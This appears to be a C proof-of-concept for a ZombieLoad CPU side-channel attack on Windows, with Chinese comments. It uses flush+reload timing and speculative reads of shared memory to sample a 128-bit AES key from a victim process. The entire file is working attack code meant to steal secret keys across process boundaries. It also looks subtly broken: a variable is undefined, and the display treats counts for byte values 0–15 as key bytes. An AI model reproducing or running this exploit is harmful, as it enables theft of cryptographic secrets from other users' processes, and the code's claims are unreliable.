#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "cacheutils_win.h"

char __attribute__((aligned(4096))) mem[256 * 4096];
char __attribute__((aligned(4096))) mapping[4096];
size_t hist[256] = {0};

int main() {
    printf("[ZombieLoad AES] 正在采样 128-bit AES 密钥...\n");
    printf("请先启动 victim_aes.exe！\n");

    // 初始化
    memset(mem, 0, sizeof(mem));
    for (size_t i = 0; i < 256; i++) flush(mem + i*4096);

    CACHE_MISS = detect_flush_reload_threshold();
    printf("[+] Threshold: %d\n", CACHE_MISS);

    // 共享内存映射（Variant 3 必须）
    HANDLE h = CreateFileMapping((HANDLE)-1, NULL, PAGE_READWRITE, 0, 4096, "LBLEAK");
    char* map1 = MapViewOfFile(h, FILE_MAP_WRITE, 0, 0, 4096);
    char* map2 = MapViewOfFile(h, FILE_MAP_READ, 0, 0, 4096);

    while (true) {
        flush(map1);

        speculation_start(s);
            maccess(0);
            maccess(mem + 4096 * map2[0]);   // ← 关键：使用泄露字节
        speculation_end(s);

        // 恢复（支持 0~255）
        for (int i = 0; i < 256; i++) {
            if (flush_reload(mem + i*4096)) hist[i]++;
        }

        // 每 2 秒刷新显示（前 16 字节）
        if (GetTickCount() % 2000 == 0) {
            system("cls");
            printf("=== 当前 AES 密钥候选（前 16 字节）===\n");
            for (int i = 0; i < 16; i++) {
                printf("0x%02X : %5zu ", i, hist[i]);
                for (int j = 0; j < hist[i]/30; j++) printf("#");
                printf("\n");
            }
        }
    }
}
